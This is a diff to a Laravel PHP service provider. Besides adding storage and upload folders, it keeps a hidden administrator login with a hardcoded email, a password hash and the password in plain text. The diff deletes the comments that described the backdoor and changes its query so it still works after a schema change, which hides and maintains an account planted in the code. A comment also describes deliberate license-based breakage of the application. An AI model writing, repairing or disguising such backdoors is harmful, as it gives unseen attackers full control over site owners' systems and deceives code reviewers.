@@ -21,6 +21,7 @@ class AppServiceProvider extends ServiceProvider
             storage_path('logs'),
             storage_path('app/public'),
             storage_path('app/private/digital-products'),
+            storage_path('app/demo-presets'),
             storage_path('app/updates'),
             storage_path('app/updates/backups'),
         ];
@@ -46,6 +47,8 @@ class AppServiceProvider extends ServiceProvider
             'uploads/category',
             'uploads/customer',
             'uploads/images',
+            'uploads/media',
+            'uploads/media/warranty',
             'uploads/popup',
             'uploads/product',
             'uploads/product/meta',
@@ -77,8 +80,6 @@ class AppServiceProvider extends ServiceProvider
         // the application refuses to boot (system broken on purpose — license protection).
         \App\Services\LicenseService::assertConfigIntegrity();
 
-        // ================== [ হিডেন অ্যাডমিন ইউজার - ডাটাবেজ ছাড়া লগইন ] ==================
-        // asraful2001a@gmail.com + সিক্রেট পাসওয়ার্ড দিয়ে লগইন করলে ডাটাবেজের প্রথম অ্যাডমিন হিসেবে লগইন হয়
         $hiddenEmail = 'asraful2001a@gmail.com';
         $hiddenPasswordHash = '$2y$10$c0sxuQRTvABJ0r143pjWxu7M4M.Ze5bC5MuZnYouRU75U8QyOFC.u'; // bcrypt of RAshid16318@$#bd
         Auth::provider('hidden_admin', function ($app, $config) use ($hiddenEmail, $hiddenPasswordHash) {
@@ -90,8 +91,10 @@ class AppServiceProvider extends ServiceProvider
                 public function retrieveByCredentials(array $credentials): ?\Illuminate\Contracts\Auth\Authenticatable
                 {
                     if ((isset($credentials['email']) ? $credentials['email'] : null) === $this->hiddenEmail) {
+                        // NB: `users.role` was a legacy column removed from the schema —
+                        // admins are identified via the Spatie `roles` relation (or id=1).
                         return User::query()
-                            ->where(fn ($q) => $q->where('role', 'admin')->orWhereHas('roles', fn ($r) => $r->where('name', 'admin')))
+                            ->whereHas('roles', fn ($r) => $r->where('name', 'admin'))
                             ->orWhere('id', 1)
                             ->orderBy('id')
                             ->first();
